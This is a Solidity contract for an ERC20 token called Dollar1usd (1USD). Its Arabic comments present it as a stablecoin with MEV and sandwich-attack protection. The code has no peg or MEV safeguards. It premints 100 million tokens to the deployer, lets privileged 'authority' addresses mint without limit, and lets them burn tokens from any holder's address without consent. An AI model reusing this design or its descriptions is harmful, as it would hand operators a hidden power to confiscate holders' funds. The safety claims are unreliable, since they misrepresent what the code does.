// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Dollar1usdToken
 * @dev التوكن المستقر لبروتوكول Dollar1usd المدعوم بآليات الحماية من الـ MEV والتفويض بدون غاز.
 */
contract Dollar1usdToken is ERC20, ERC20Permit, Ownable {

    // تتبع العناوين التنفيذية المصرح لها بإدارة التدفقات وحماية المعاملات
    mapping(address => bool) public isAuthorityCluster;

    // الأحداث لمراقبة حركة البنية التحتية
    event AuthorityStatusUpdated(address indexed target, bool status);
    event ProtectedMint(address indexed to, uint256 amount);

    modifier onlyAuthority() {
        require(isAuthorityCluster[msg.sender] || msg.sender == owner(), "Dollar1usd: Caller is not authorized");
        _;
    }

    constructor() 
        ERC20("Dollar1usd", "1USD") 
        ERC20Permit("Dollar1usd") 
        Ownable(msg.sender) 
    {
        // صك أولي للمؤسس لإدارة السيولة المبدئية وحزم الاختبارات
        _mint(msg.sender, 100000000 * 10**decimals());
    }

    /**
     * @dev تحديث صلاحيات عناوين الـ Authority Cluster (مثل الـ Relayers والـ Builders الموثوقين)
     */
    function updateAuthorityStatus(address _target, bool _status) external onlyOwner {
        require(_target != address(0), "Dollar1usd: Invalid address");
        isAuthorityCluster[_target] = _status;
        emit AuthorityStatusUpdated(_target, _status);
    }

    /**
     * @dev صك آمن ومحمي للتوكنات يتم عبر البنية التحتية فقط لضمان سلامة المعاملات ومقاومة الـ Sandwich attacks
     */
    function mintProtected(address _to, uint256 _amount) external onlyAuthority {
        _mint(_to, _amount);
        emit ProtectedMint(_to, _amount);
    }

    /**
     * @dev حرق التوكنات لتنظيم مسارات السيولة عبر السلاسل
     */
    function burnFromInfrastructure(address _from, uint256 _amount) external onlyAuthority {
        _burn(_from, _amount);
    }
}
